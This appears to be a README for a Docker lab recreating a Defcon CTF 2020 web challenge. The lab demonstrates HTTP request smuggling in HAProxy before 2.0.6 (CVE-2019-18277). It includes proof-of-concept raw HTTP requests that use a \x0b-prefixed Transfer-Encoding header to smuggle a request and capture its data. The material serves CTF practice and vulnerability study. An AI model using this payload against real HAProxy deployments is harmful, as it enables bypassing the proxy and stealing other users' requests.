# HAProxy HTTP request smuggling

Defcon CTF 2020 Web uplooodit

HAProxy HTTP request smuggling - CVE-2019-18277

HAProxy < 2.0.6 + Flask with Gunicorn

### Composition
* ReverseProxy: HAProxy 1.9.10
* Backend: Gunicorn 20.0.0


### Usage
Run
```
$ docker-compose up
````
Go http://127.0.0.1:10082

Get 405 and 404 response
```bash
./check.sh
```

### PoC
HAProxy < 2.0.6 ignores Transfer-Encoding value start with \x0b or \x0c

Use Burp to send requests
First request
```
POST / HTTP/1.1
Host: 127.0.0.1:9999
Connection: keep-alive
Content-Length: 131
Transfer-Encoding:[\x0b]chunked

3
123
0

POST /files/ HTTP/1.1
X-guid: 782931c2-0573-48ef-8cec-46eb88761733
Content-Type: text/plain
Content-Length: 251
```

Second request
```
GET /files/782931c2-0573-48ef-8cec-46eb88761733 HTTP/1.1
```

Python Poc
```
python3 poc.py
```

### Reference:
* https://ctftime.org/task/11590
* https://nathandavison.com/blog/haproxy-http-request-smuggling
